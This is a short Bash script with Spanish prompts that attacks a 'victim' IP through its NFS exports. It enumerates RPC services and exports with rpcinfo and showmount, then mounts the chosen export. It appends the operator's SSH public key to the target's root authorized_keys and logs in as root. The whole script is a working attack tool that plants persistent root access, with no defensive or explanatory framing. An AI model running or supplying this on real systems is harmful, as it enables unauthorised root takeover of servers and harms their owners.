#!/bin/bash

clear

echo ""
echo "	NFS = Sistema de Archivos de Red"

echo ""
echo "	**********************************************************************"
echo -e "	* \e[33mPara ejecutar el siguiente script debe tener instalado previamente \e[0m*"
echo -e "	* \e[33mrpcbind y nfs-common, si aun no lo tiene instalado solo ejecute    \e[0m*"
echo -e "	* \e[33mapt install rpcbind y apt install nfs-common                       \e[0m*"
echo "	**********************************************************************"
echo ""

echo ""
echo -e "\e[31m	Ingrese la ip victima	\e[0m"
echo ""
read ip
echo ""

rpcinfo -p $ip

echo ""
echo -e "\e[33m	showmount	\e[0m"
echo ""
showmount -e $ip
echo ""

echo -e "\e[31m	Acontinuacion se creara la llave ssh \e[0m"
echo ""
ssh-keygen
echo ""
mkdir /tmp/r00t

echo ""
echo -e "\e[31m	Ingrese el resultado del showmount \e[0m"
echo ""
read showmount

mount -t nfs $ip:$showmount /tmp/r00t
cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys
umount /tmp/r00t

ssh root@$ip

